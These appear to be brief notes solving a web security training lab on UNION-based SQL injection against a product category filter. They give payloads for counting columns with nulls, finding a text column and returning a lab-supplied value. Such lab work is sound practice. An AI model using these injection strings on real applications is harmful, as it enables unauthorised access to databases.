go to the homepage and filter as pets


1) we need to understand how much column has the current table we are querying so we have to use:
    category=Pets' union select null  --

    but we obtain internal server error so we fuzz the null in order to put in each request an additional null 
    
    ' union select null, null, null --
    it is the correct one

2) now we need to find columns that are text so we try 
' union select 'a', null, null --
' union select null, 'a', null -- // this is the right one
' union select null, null, 'a' --


3) to solve the lab we need to select the random value provided by the lab
Pets' union select null, 'WeRfJ4' , null --
